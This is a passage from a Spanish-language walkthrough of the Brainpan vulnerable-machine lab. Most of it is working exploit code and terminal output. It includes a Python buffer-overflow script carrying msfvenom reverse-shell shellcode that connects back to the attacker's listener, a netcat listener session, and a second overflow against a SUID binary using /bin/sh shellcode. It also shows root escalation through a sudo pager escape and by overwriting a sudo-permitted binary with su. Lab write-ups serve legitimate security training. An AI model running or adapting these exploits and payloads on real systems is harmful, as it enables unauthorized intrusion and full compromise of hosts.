[</span><span class="na">*</span><span class="p">] Enviando shellcode
[</span><span class="s2">+</span><span class="p">] Revisa tu listener</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 192.168.204.1
Microsoft Windows [Versión 10.0.22621.1105]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\pc1\Desktop></span><span class="no">whoami</span><span class="p">
gatogamer1155\pc1

C:\Users\pc1\Desktop></span>
</code></pre></div></div>

<div><p>Esto fue en local, para la máquina brainpan solo hace falta cambiar la ip en el script</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">connect </span><span class="kd">=</span><span class="p"> shell.connect((</span><span class="s2">"192.168.100.62"</span><span class="p">,</span><span class="na"> 9999</span><span class="p">))</span>
</code></pre></div></div>

<div><p>Volvemos a ejecutar el script y conseguimos una shell como puck en la máquina victima</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ python3 </span><span class="p">exploit.py
[</span><span class="na">*</span><span class="p">] Enviando shellcode
[</span><span class="s2">+</span><span class="p">] Revisa tu listener</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 192.168.100.62
CMD Version 1.4.1

Z:\home\puck></span><span class="no">whoami</span><span class="p">
File not found.

Z:\home\puck></span>
</code></pre></div></div>

<div><p>No reconoce comandos como whoami, y tiene sentido porque aunque es un exe lo que corre por detrás es un linux, asi que cambiaremos el payload con msfvenom</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ msfvenom </span><span class="p">-p linux/x86/shell_reverse_tcp LHOST=192.168.100.41 LPORT=443 EXITFUNC=thread -a x86 -b "\x00" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
shellcode =  b""
shellcode += b"\xd9\xe1\xd9\x74\x24\xf4\xb8\xb6\xfb\x1a\x01"
shellcode += b"\x5b\x29\xc9\xb1\x12\x31\x43\x17\x83\xc3\x04"
shellcode += b"\x03\xf5\xe8\xf8\xf4\xc8\xd5\x0a\x15\x79\xa9"
shellcode += b"\xa7\xb0\x7f\xa4\xa9\xf5\x19\x7b\xa9\x65\xbc"
shellcode += b"\x33\x95\x44\xbe\x7d\x93\xaf\xd6\xbd\xcb\x34"
shellcode += b"\x0f\x56\x0e\xb5\x4e\x1d\x87\x54\xe0\x07\xc8"
shellcode += b"\xc7\x53\x7b\xeb\x6e\xb2\xb6\x6c\x22\x5c\x27"
shellcode += b"\x42\xb0\xf4\xdf\xb3\x19\x66\x49\x45\x86\x34"
shellcode += b"\xda\xdc\xa8\x08\xd7\x13\xaa"</span>
</code></pre></div></div>

<div><p>Solo cambiaremos el shellcode y el script final quedaria asi</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="kd">from </span><span class="p">pwn </span><span class="kd">import </span><span class="p">log, socket

offset </span><span class="kd">=</span><span class="na"> 524</span><span class="p">
junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> offset
jmpesp </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\xf3\x12\x17\x31"</span><span class="p">
nops </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\x90"</span><span class="kd"> *</span><span class="na"> 16</span><span class="p">

shellcode </span><span class="kd">=  </span><span class="k">b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xd9\xe1\xd9\x74\x24\xf4\xb8\xb6\xfb\x1a\x01"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x5b\x29\xc9\xb1\x12\x31\x43\x17\x83\xc3\x04"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x03\xf5\xe8\xf8\xf4\xc8\xd5\x0a\x15\x79\xa9"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xa7\xb0\x7f\xa4\xa9\xf5\x19\x7b\xa9\x65\xbc"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x33\x95\x44\xbe\x7d\x93\xaf\xd6\xbd\xcb\x34"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x0f\x56\x0e\xb5\x4e\x1d\x87\x54\xe0\x07\xc8"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xc7\x53\x7b\xeb\x6e\xb2\xb6\x6c\x22\x5c\x27"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\x42\xb0\xf4\xdf\xb3\x19\x66\x49\x45\x86\x34"</span><span class="p">
shellcode </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"\xda\xdc\xa8\x08\xd7\x13\xaa"</span><span class="p">

log.info(</span><span class="s2">"Enviando shellcode"</span><span class="p">)

shell </span><span class="kd">=</span><span class="p"> socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect </span><span class="kd">=</span><span class="p"> shell.connect((</span><span class="s2">"192.168.100.62"</span><span class="p">,</span><span class="na"> 9999</span><span class="p">))

shell.send(junk </span><span class="kd">+</span><span class="p"> jmpesp </span><span class="kd">+</span><span class="p"> nops </span><span class="kd">+</span><span class="p"> shellcode </span><span class="kd">+</span><span class="k"> b</span><span class="s2">"\n\r"</span><span class="p">)

data </span><span class="kd">=</span><span class="p"> shell.recv(</span><span class="na">1024</span><span class="p">)
shell.close()

log.success(</span><span class="s2">"Revisa tu listener"</span><span class="p">)</span>
</code></pre></div></div>

<div><p>Lo ejecutamos nuevamente y ahora si tenemos una shell de linux, conseguimos el usuario</p></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ python3 </span><span class="p">exploit.py
[</span><span class="na">*</span><span class="p">] Enviando shellcode
[</span><span class="s2">+</span><span class="p">] Revisa tu listener</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 192.168.100.62
export HOME=/home/puck     
script /dev/null -c bash
</span><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
</span><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
192.168.100.62 
</span><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Mirando privilegios de sudoers encontramos que podemos ejecutar un binario como root</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
Matching Defaults entries for puck on this host:
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (</span><span class="na">root</span><span class="p">) NOPASSWD: </span><span class="kd">/home/anansi/bin/anansi_util</span><span class="p">
</span><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Ejecutandolo tenemos varias opciones entre ellas ver el manual de un comando</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
</span><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Al mostrar el manual entra en un modo paginate, si escribimos bash somos root</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo /home/anansi/bin/anansi_util manual whoami
WHOAMI(1)                                                                                       User Commands

NAME
       whoami - print effective userid

SYNOPSIS
       whoami [OPTION]...

DESCRIPTION
       Print the user name associated with the current effective user ID.  Same as id -un.

       --help display this help and exit

       --version
              output version information and exit

AUTHOR
       Written by Richard Mlynarik.

REPORTING BUGS
       Report whoami bugs to bug-coreutils@gnu.org
       GNU coreutils home page: <http://www.gnu.org/software/coreutils/>
       General help using GNU software: <http://www.gnu.org/gethelp/>
       Report whoami translation bugs to <http://translationproject.org/team/>

COPYRIGHT
       Copyright © 2011 Free Software Foundation, Inc.  License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
       This is free software: you are free to change and redistribute it.  There is NO WARRANTY, to the extent permitted by law.

SEE ALSO
       The full documentation for whoami is maintained as a Texinfo manual.  If the info and whoami programs are properly installed at your site, the command

              info coreutils 'whoami invocation'

       should give you access to the complete manual.

GNU coreutils 8.12.197-032bb
 Manual page whoami(1) line 1/41 (END) (press h for help or q to quit)</span><span class="kd">!bash</span><span class="p">
</span><span class="s2">root@brainpan</span><span class="p">:</span><span class="na">/usr/share/man</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="s2">root@brainpan</span><span class="p">:</span><span class="na">/usr/share/man</span><span class="p"># hostname -I
192.168.100.62 
</span><span class="s2">root@brainpan</span><span class="p">:</span><span class="na">/usr/share/man</span><span class="p">#</span>
</code></pre></div></div>

<div><p>Esta es una forma fácil, pero hay otra forma de escalar privilegios, con un binario suid</p></div>
<div><p>Buscando archivos suid encontramos el binario validate que pertenece a anansi</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -perm -4000 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping6
/bin/ping
/usr/bin/sudo
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/lppasswd
/usr/bin/passwd
/usr/bin/gpasswd
/usr/sbin/uuidd
/usr/sbin/pppd
</span><span class="kd">/usr/local/bin/validate</span><span class="p">
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/pt_chown
</span><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /usr/local/bin/validate
-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 </span><span class="kd">/usr/local/bin/validate
</span><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
</code></pre></div></div>

<div><p>Al ejecutarlo nos pide un argumento, pero realmente no hace nada al darselo</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ validate
usage validate &ltinput>
</span><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ validate test
validating input...passed.
</span><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>                       
</code></pre></div></div>

<div><p>Lo pasamos a nuestra máquina y empezamos a debuguearlo, iniciamos por el offset</p></div>
<div><p>Creamos un patron con la herramienta de metasploit en este caso de 200 bytes</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ pattern_create</span><span class="p"> -l 200 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span>
</code></pre></div></div>

<div><p>Ahora corremos el programa con gdb pasandole como argumento el patrón</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ gdb</span><span class="p"> -q ./validate
Reading symbols from </span><span class="s2">./validate</span><span class="p">...
</span><span class="kd">gdb-peda$</span><span class="p"> run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/gato/Desktop/Vulnhub/Brainpan/validatea/validate Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
</span><span class="na">[----------------------------------registers-----------------------------------]</span><span class="p">
</span><span class="s2">EAX</span><span class="p">:</span><span class="na"> 0xffffd5a8 </span><span class="p">("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
</span><span class="s2">EBX</span><span class="p">: 0x41366441 ('Ad6A')
</span><span class="s2">ECX</span><span class="p">:</span><span class="na"> 0xffffd9a0 </span><span class="p">("g2Ag3Ag4Ag5Ag")
</span><span class="s2">EDX</span><span class="p">:</span><span class="na"> 0xffffd663 </span><span class="p">("g2Ag3Ag4Ag5Ag")
</span><span class="s2">ESI</span><span class="p">:</span><span class="na"> 0xf7fa5000 </span><span class="p">--> 0x1e4d6c 
</span><span class="s2">EDI</span><span class="p">:</span><span class="na"> 0xf7fa5000 </span><span class="p">--> 0x1e4d6c 
</span><span class="s2">EBP</span><span class="p">: 0x64413764 ('d7Ad')
</span><span class="s2">ESP</span><span class="p">:</span><span class="na"> 0xffffd620 </span><span class="p">("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
</span><span class="s2">EIP</span><span class="p">: 0x39644138 ('8Ad9')
</span><span class="s2">EFLAGS</span><span class="p">: 0x10286 (</span><span class="s2">carry </span><span class="kd">PARITY </span><span class="s2">adjust zero </span><span class="kd">SIGN</span><span class="s2"> trap </span><span class="kd">INTERRUPT </span><span class="s2">direction overflow</span><span class="p">)
</span><span class="na">[-------------------------------------code-------------------------------------]
</span><span class="kd">Invalid $PC address: 0x39644138
</span><span class="na">[------------------------------------stack-------------------------------------]</span><span class="p">
0000| </span><span class="na">0xffffd620</span><span class="p"> ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0004| </span><span class="na">0xffffd624</span><span class="p"> ("e1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0008| </span><span class="na">0xffffd628</span><span class="p"> ("2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0012| </span><span class="na">0xffffd62c</span><span class="p"> ("Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0016| </span><span class="na">0xffffd630</span><span class="p"> ("e5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0020| </span><span class="na">0xffffd634</span><span class="p"> ("6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0024| </span><span class="na">0xffffd638</span><span class="p"> ("Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0028| </span><span class="na">0xffffd63c</span><span class="p"> ("e9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
</span><span class="na">[------------------------------------------------------------------------------]</span><span class="p">
Legend: </span><span class="kd">code</span><span class="p">,</span><span class="na"> data</span><span class="p">,</span><span class="s2"> rodata</span><span class="p">, value
Stopped reason: </span><span class="kd">SIGSEGV</span><span class="p">
</span><span class="na">0x39644138 </span><span class="p">in </span><span class="no">??</span><span class="p"> ()
</span><span class="kd">gdb-peda$</span>
</code></pre></div></div>

<div><p>Con pattern_offset de metasploit le pasamos la dirección y nos dice que el offset es 116 bytes</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ pattern_offset</span><span class="p"> -q 0x39644138
[*] Exact match at offset 116</span>
</code></pre></div></div>

<div><p>Con nasm_shell de metasploit podemos ver el valor de call eax que es FF D0</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ nasm_shell
</span><span class="kd">nasm ></span><span class="p"> call EAX
00000000  </span><span class="na">FFD0</span><span class="p">                call eax</span>
</code></pre></div></div>

<div><p>A objdump le pasamos el binario y grepeamos por el valor que vimos antes</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ objdump </span><span class="p">-D validate | </span><span class="s2">grep </span><span class="no">"ff d0"</span><span class="p">
</span><span class="na"> 80484af</span><span class="p">:  </span><span class="kd">ff d0</span><span class="p">        call   *%eax
</span><span class="na"> 804862b</span><span class="p">:  </span><span class="kd">ff d0</span><span class="p">        call   *%eax</span>
</code></pre></div></div>

<div><p>Nos quedamos con el primer valor pero como estamos en little endian le daremos la vuelta a la direccion</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="p">\x08\x04\x84\xaf    -->    \xaf\x84\x04\x08</span>
</code></pre></div></div>

<div><p>Generamos un shellcode con msfvenom que nos ejecute /bin/sh con el encoder shikata_ga_nai</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">❯ msfvenom</span><span class="p"> -p linux/x86/exec CMD=/bin/sh -a x86 -e x86/shikata_ga_nai -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Payload size: 70 bytes
Final size of python file: 416 bytes
shellcode =  b""
shellcode += b"\xda\xcf\xba\x0b\x5d\x35\xa9\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x0b\x31\x55\x1a\x03\x55\x1a"
shellcode += b"\x83\xed\xfc\xe2\xfe\x37\x3e\xf1\x99\x9a\x26"
shellcode += b"\x69\xb4\x79\x2e\x8e\xae\x52\x43\x39\x2e\xc5"
shellcode += b"\x8c\xdb\x47\x7b\x5a\xf8\xc5\x6b\x54\xff\xe9"
shellcode += b"\x6b\x4a\x9d\x80\x05\xbb\x12\x3a\xda\x94\x87"
shellcode += b"\x33\x3b\xd7\xa8"</span>
</code></pre></div></div>

<div><p>Finalmente nuestro exploit quedaria iniciando por el shellcode y enviandole A por lo que quede de espacio despues del shellcode para llegar al offset y finalmente le pasamos la direccion que hace call a eax para que vuelva y ejecute el shellcode, asi nos dará una sh</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python

</span><span class="p">offset </span><span class="kd">=</span><span class="na"> 116</span><span class="p">

shellcode </span><span class="kd">=</span><span class="k">  b</span><span class="s2">""</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\xda\xcf\xba\x0b\x5d\x35\xa9\xd9\x74\x24\xf4"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x5d\x2b\xc9\xb1\x0b\x31\x55\x1a\x03\x55\x1a"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x83\xed\xfc\xe2\xfe\x37\x3e\xf1\x99\x9a\x26"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x69\xb4\x79\x2e\x8e\xae\x52\x43\x39\x2e\xc5"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x8c\xdb\x47\x7b\x5a\xf8\xc5\x6b\x54\xff\xe9"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x6b\x4a\x9d\x80\x05\xbb\x12\x3a\xda\x94\x87"</span><span class="p">
shellcode </span><span class="kd">+=</span><span class="k"> b</span><span class="s2">"\x33\x3b\xd7\xa8"</span><span class="p">

junk </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"A"</span><span class="kd"> *</span><span class="p"> (offset </span><span class="kd">-</span><span class="k"> len</span><span class="p">(shellcode))

calleax </span><span class="kd">=</span><span class="k"> b</span><span class="s2">"\xaf\x84\x04\x08"</span><span class="p">

</span><span class="k">print</span><span class="p">(shellcode </span><span class="kd">+</span><span class="p"> junk </span><span class="kd">+</span><span class="p"> calleax)</span>
</code></pre></div></div>

<div><p>Ejecutamos validate como con el exploit como argumento, nos dara una sh como anansi</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">puck@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">$ validate $(python exploit.py)
</span><span class="kd">$</span><span class="p"> whoami       
anansi
</span><span class="kd">$</span><span class="p"> hostname -I
192.168.100.62</span>
</code></pre></div></div>

<div><p>El binario que teniamos en sudoers pertenece a anansi lo que significa que podemos alterarlo</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">$</span><span class="p"> ls -l /home/anansi/bin/anansi_util
-rwxr-xr-x 1 </span><span class="na">anansi anansi </span><span class="p">31124 Jan 13 23:58 /home/anansi/bin/anansi_util</span>
</code></pre></div></div>

<div><p>Lo que haremos sera copiar su con ese nombre, de manera que al ejecutarlo se ejecute 'sudo su'</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">$</span><span class="p"> cp /bin/su /home/anansi/bin/anansi_util</span>
</code></pre></div></div>

<div><p>Como al ejecutar ese binario con sudo se ejecuta su, nos convertimos en root</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="kd">$</span><span class="p"> sudo /home/anansi/bin/anansi_util
</span><span class="s2">root@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p"># id
uid=0(root) gid=0(root) groups=0(root)
</span><span class="s2">root@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
192.168.100.62 
</span><span class="s2">root@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/b.txt

_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|
                                            

                                              http://www.techorganic.com 
                                              
</span><span class="s2">root@brainpan</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
</code></pre></div></div>


<p><a href="./../../">Página Principal</a></p>

      </section>
    </div>
  </body>
</html>
